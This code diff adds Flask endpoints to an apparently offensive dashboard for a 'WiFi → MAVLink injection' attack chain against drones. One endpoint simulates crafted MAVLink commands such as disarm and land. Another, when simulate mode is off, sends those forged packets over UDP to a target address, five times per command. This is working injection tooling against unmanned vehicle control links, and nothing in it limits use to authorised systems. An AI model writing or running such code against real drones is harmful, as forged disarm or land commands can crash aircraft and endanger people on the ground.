@@ -1170,6 +1170,156 @@ def api_events():
                     headers={"Cache-Control": "no-cache", "X-Accel-Buffering": "no"})
 
 
+# --- Chain 2: WiFi → MAVLink injection endpoints ---
+
+chain2_state = {
+    "status": "idle",
+    "proxy_running": False,
+    "proxy_stats": {},
+    "evil_twin": None,
+    "last_injection": None,
+    "injections": [],
+}
+
+
+@app.route("/api/chain2/status")
+def api_chain2_status():
+    return jsonify(chain2_state)
+
+
+@app.route("/api/chain2/simulate", methods=["POST"])
+def api_chain2_simulate():
+    """Run a simulated Chain 2 attack for demo purposes."""
+    try:
+        from exploit_chains.wifi_mavlink_chain import (
+            ATTACK_COMMANDS, build_command_long,
+        )
+    except ImportError:
+        return jsonify({"error": "Chain 2 module not found"}), 500
+
+    target_id = request.json.get("target_id") if request.json else None
+    commands = request.json.get("commands", ["disarm", "land"]) if request.json else ["disarm", "land"]
+
+    results = []
+    for cmd_name in commands:
+        if cmd_name not in ATTACK_COMMANDS:
+            results.append({"command": cmd_name, "status": "unknown"})
+            continue
+        cmd = ATTACK_COMMANDS[cmd_name]
+        pkt = build_command_long(1, 1, cmd["cmd_id"], list(cmd["params"]))
+        entry = {
+            "id": uuid.uuid4().hex[:8],
+            "timestamp": datetime.now(timezone.utc).isoformat(),
+            "target_id": target_id,
+            "command": cmd_name,
+            "description": cmd["desc"],
+            "severity": cmd["severity"],
+            "status": "simulated",
+            "packet_hex": pkt.hex(),
+            "packet_size": len(pkt),
+        }
+        results.append(entry)
+        action_log.append({
+            "id": entry["id"],
+            "timestamp": entry["timestamp"],
+            "target_id": target_id,
+            "target_name": target_id or "MAVLink Target",
+            "action": f"chain2_{cmd_name}",
+            "label": f"Chain 2: {cmd['desc']}",
+            "status": "simulated",
+            "result": f"[SIMULATED] {cmd['desc']} ({len(pkt)} bytes)",
+        })
+
+    chain2_state["last_injection"] = results[-1] if results else None
+    chain2_state["injections"].extend(results)
+
+    return jsonify({
+        "chain": "wifi_mavlink",
+        "status": "simulated",
+        "results": results,
+    })
+
+
+@app.route("/api/chain2/inject", methods=["POST"])
+def api_chain2_inject():
+    """Inject a MAVLink command via Chain 2 (dry-run in simulate mode)."""
+    if not request.json:
+        return jsonify({"error": "JSON body required"}), 400
+
+    target_id = request.json.get("target_id")
+    command = request.json.get("command")
+    target_endpoint = request.json.get("endpoint")
+
+    if not command:
+        return jsonify({"error": "command is required"}), 400
+
+    try:
+        from exploit_chains.wifi_mavlink_chain import ATTACK_COMMANDS, build_command_long
+    except ImportError:
+        return jsonify({"error": "Chain 2 module not found"}), 500
+
+    if command not in ATTACK_COMMANDS:
+        return jsonify({"error": f"Unknown command: {command}"}), 400
+
+    cmd = ATTACK_COMMANDS[command]
+    pkt = build_command_long(1, 1, cmd["cmd_id"], list(cmd["params"]))
+
+    entry = {
+        "id": uuid.uuid4().hex[:8],
+        "timestamp": datetime.now(timezone.utc).isoformat(),
+        "target_id": target_id,
+        "command": command,
+        "description": cmd["desc"],
+        "severity": cmd["severity"],
+        "status": "dry_run" if simulate_mode else "pending",
+        "packet_hex": pkt.hex(),
+        "packet_size": len(pkt),
+    }
+
+    if not simulate_mode and target_endpoint:
+        import socket as _sock
+        parts = target_endpoint.split(":")
+        if len(parts) == 2:
+            try:
+                sock = _sock.socket(_sock.AF_INET, _sock.SOCK_DGRAM)
+                for i in range(5):
+                    p = build_command_long(1, 1, cmd["cmd_id"],
+                                           list(cmd["params"]), seq=i)
+                    sock.sendto(p, (parts[0], int(parts[1])))
+                    time.sleep(0.05)
+                sock.close()
+                entry["status"] = "sent"
+            except Exception as e:
+                entry["status"] = "error"
+                entry["error"] = str(e)
+
+    action_log.append({
+        "id": entry["id"],
+        "timestamp": entry["timestamp"],
+        "target_id": target_id,
+        "target_name": target_id or "MAVLink Target",
+        "action": f"chain2_{command}",
+        "label": f"Chain 2: {cmd['desc']}",
+        "status": entry["status"],
+        "result": f"[{entry['status'].upper()}] {cmd['desc']}",
+    })
+
+    chain2_state["last_injection"] = entry
+    chain2_state["injections"].append(entry)
+
+    return jsonify(entry)
+
+
+@app.route("/api/chain2/commands")
+def api_chain2_commands():
+    """List available Chain 2 attack commands."""
+    try:
+        from exploit_chains.wifi_mavlink_chain import ATTACK_COMMANDS
+        return jsonify(ATTACK_COMMANDS)
+    except ImportError:
+        return jsonify({"error": "Chain 2 module not found"}), 500
+
+
 def main():
     global simulate_mode
 
